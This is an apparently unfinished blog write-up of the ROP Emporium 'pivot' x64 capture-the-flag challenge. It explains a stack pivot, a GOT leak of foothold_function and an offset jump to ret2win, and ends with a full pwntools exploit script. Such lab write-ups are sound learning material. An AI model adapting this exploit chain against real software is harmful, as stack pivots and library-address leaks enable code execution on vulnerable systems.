
---
layout: post
permalink: /ROP_emporium/2022-07-13-ROP-x64-Challenge-7
title: ROP x64 Challenge 7
status: in progress
type: post
published: false
comments: true
date: 2022-07-13
---
## Challenge 7

Continuing to work our way through common problems with creating ROP exploits, what happens if you run out of space (like I did last challenge) and you can't shrink your payload anymore? Well, if you can write data into other locations on the stack then you can just write your payload there and call it from your smaller area. Which is exactly what this challenge is about.

> There's only enough space for a small ROP chain on the stack, but you've been given space to stash a much larger chain elsewhere. Learn how to pivot the stack onto a new location.


However, there's another challenge that we face in this binary. Rather then having a print_file function we have a ret2win function. Which is nice, but it is placed in an linked library and not normally called, so there is no static address to call it by. 

However first things first, lets get access to the larger exploit chain.

Looking at the usefulGadgets section we see the following.

```
pwndbg> disass usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x00000000004009bb <+0>:     pop    rax
   0x00000000004009bc <+1>:     ret    
   0x00000000004009bd <+2>:     xchg   rsp,rax
   0x00000000004009bf <+4>:     ret    
   0x00000000004009c0 <+5>:     mov    rax,QWORD PTR [rax]
   0x00000000004009c3 <+8>:     ret    
   0x00000000004009c4 <+9>:     add    rax,rbp
   0x00000000004009c7 <+12>:    ret    
   0x00000000004009c8 <+13>:    nop    DWORD PTR [rax+rax*1+0x0]
```

Also running piviot gives the following
```
./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7fb54f72cf10
Send a ROP chain now and it will land there
> 
Thank you!

Now please send your stack smash
> 
Thank you!

Exiting
```

A quick google of the `xchg` instruction shows that it is exchange. Basically it just swaps the values. Combine that with the pop rax gadget we have, and we can make the stack pointer whatever value we want. If you look through the output of the pivot binary, it actually prints off the location on the heap that we store our second chain in too. This means we just have to make the stack pointer that value.

An important note, that value changes every time the binary is run, so you can not just hard code it. You have to parse the binaries outputs to craft your payload.



```
         | stack          |
         | -------------- |
32 bytes | start buffer   |
8  bytes | base pointer   | 
8  bytes | pop rax gadget |
8  bytes | rax value      | # This must be calculated from the binaries print out
8  bytes | xchg gadget    | 
8  bytes | -------------- |

```

This will start executing our chain stored in the heap which we now have to craft.

So the idea is pretty simple, we just have to call the ret2win function. Trying to figure out where the ret2win function is shows that it is in the attached library.

```
pwndbg> disass ret2win
No symbol table is loaded.  Use the "file" command.
pwndbg> ls
core  exploit.py  flag.txt  libpivot.so  notes  payload  pivot  pivot.zip
pwndbg> file ./libpivot.so 
Reading symbols from ./libpivot.so...
(No debugging symbols found in ./libpivot.so)
Error in re-setting breakpoint 1: Function "main" not defined.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
pwndbg> disass ret2win
Dump of assembler code for function ret2win:
   0x0000000000000a81 <+0>:     push   rbp
   0x0000000000000a82 <+1>:     mov    rbp,rsp
   0x0000000000000a85 <+4>:     sub    rsp,0x40

```

So we have to figure out some way to get into the added library. To do this let's look at the functions that the pivot binary uses.

```
rabin2 -i ./pivot
[Imports]
nth vaddr      bind   type   lib name
―――――――――――――――――――――――――――――――――――――
1   0x004006d0 GLOBAL FUNC       free
2   0x004006e0 GLOBAL FUNC       puts
3   0x004006f0 GLOBAL FUNC       printf
4   0x00400700 GLOBAL FUNC       memset
5   0x00400710 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x00400720 GLOBAL FUNC       foothold_function
9   0x00400730 GLOBAL FUNC       malloc
10  0x00400740 GLOBAL FUNC       setvbuf
11  0x00400750 GLOBAL FUNC       exit
```

In there we see the binary uses the foothold function and according to the challenge description "This challenge imports a function named foothold_function() from a library that also contains a ret2win() function." To do this, we have to understand how the plt (Procedure Linkage Table) works and external libraries are added to a binary. 

To understand how the plt binary works, I would recommend reading [this](https://ropemporium.com/guide.html#Appendix%20A) section on ROP Emporium. 

So what we need to do is call the foothold function which is in the external library, but has a plt entry, in order to populate the value in the global offset table to get an address in the linked library. We then figure out what that value is and then add/subtract the offset to the ret2win function and go to that location. 

If we look at the gadgets that we have access to, we have complete control over rax, can add values to rax (if we can control rbp), and we can place arbitrary chunks of memory into rax.

After doing a quick check, we are able to easily find a pop rbp register as well. 
So we collect the information that we need:

```
gdb ./libpivot.so
pwndbg> disass foothold_function 
Dump of assembler code for function foothold_function:
   0x000000000000096a <+0>:     push   rbp
   0x000000000000096b <+1>:     mov    rbp,rsp
   0x000000000000096e <+4>:     lea    rdi,[rip+0x1ab]        # 0xb20
   0x0000000000000975 <+11>:    call   0x830 <puts@plt>
   0x000000000000097a <+16>:    nop
   0x000000000000097b <+17>:    pop    rbp
   0x000000000000097c <+18>:    ret    
End of assembler dump.
pwndbg> disass ret2win 
Dump of assembler code for function ret2win:
   0x0000000000000a81 <+0>:     push   rbp
   0x0000000000000a82 <+1>:     mov    rbp,rsp
   0x0000000000000a85 <+4>:     sub    rsp,0x40

```

0x96a-0xa81 = offset

Global offset Table address
```
pwndbg> got

GOT protection: Partial RELRO | GOT functions: 9
 
...
[0x601040] foothold_function -> 0x400726 (foothold_function@plt+6) ◂— push   5
...

pwndbg> plt
...
0x400720: foothold_function@plt
...
```

Finally, let's see if there is anything that can move the IP to rax.

```
pwndbg> ropper -- --search "jmp rax"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp rax

[INFO] File: /root/working/pivot/pivot_64/pivot
0x00000000004007c1: jmp rax; 
```


And that gadget works perfectly. So we can construct our payload as follows:

```
         | stack          |
         | -------------- |
8  bytes | foothold_func  | # call foothold function so it is populated
8  bytes | pop_rax gadget |                                                     
8  bytes | foothold got   | # The memory location of the footholds GOT entry                       
8  bytes | mov rax [rax]  | # Place the value at rax into rax               
8  bytes | pop rbp        | #                                                     
8  bytes | offset         | # offset between foothold and ret2win func        
8  bytes | add rax, rbp   | # Add the offset to rax                   
8  bytes | jmp rax        | # Call the jmp rax gadget to call ret2win                       
8  bytes | -------------- |

```

You would then place this payload into the heap and call it with the previously crafted attack which gives us the overall exploit of:

```Python
#!/usr/bin/python3

from pwn import *

write_loc 	= 0x601029
print_file 	= p64(0x400620)
target		= "./pivot"
back_junk 	= b"B" * 20

# The amount to fill the buffer
junk = b'A' * 0x20

# The 8 bytes to fill the new base pointer from the leave
new_bp = p32(0xc0deba5e)*2

"""
Place a string (1st arg) into the location
given by the 2nd arg. Note the 2nd arg should be 
packed
"""
import binascii
def print_payload(payload):
	for i in range(0, len(payload), 8):
		continue
		print(binascii.hexlify(payload[i:i+8]))

io = process(target)
first_out = io.clean(0.5).decode("utf-8")
print(first_out)
stack_smash = junk + new_bp

############### Set up the pivot ##############

# pop rax
stack_smash += p64(0x04009bb)

# the RAX binary
# I need to be interacting with the binary here by parsing out the heap loc
pivot_loc = int(first_out.split("\n")[4].split()[-1], 16)
stack_smash += p64(pivot_loc)

# exchange rsp and rax
stack_smash += p64(0x04009bd)

stack_smash += back_junk

################ create the payload ####################
#Fill up the buffer and the base pointer

# call the foothold function
payload = p64(0x00400720)

# pop rax off with the value of the location of the got for the foothold func
payload += p64(0x04009bb)
payload += p64(0x601040)

# mov the value in the got into rax
payload += p64(0x4009c0)

# place the offset from foothold to ret2win in rbp
## pop rbp
payload += p64(0x004007c8)
## offset to place in it
payload += p64(0xa81-0x96a)

# add the offset to rax
payload += p64(0x04009c4)

# jump to rax
payload += p64(0x04007c1)

# print("The payload is:")
# print(payload)
print("Payload size is:" + str(len(payload)))
input("Hit enter to apptempt exploit")

print(io.clean(0.5).decode("utf-8"))
io.send(payload)
print(io.clean(0.5).decode("utf-8"))
io.send(stack_smash)
io.send(payload)
input("exploit sent hit enter to end")

print(io.clean(0.5).decode("utf-8"))
sleep(1)

f = open('./payload', 'wb')
f.write(payload)
f.close()

```
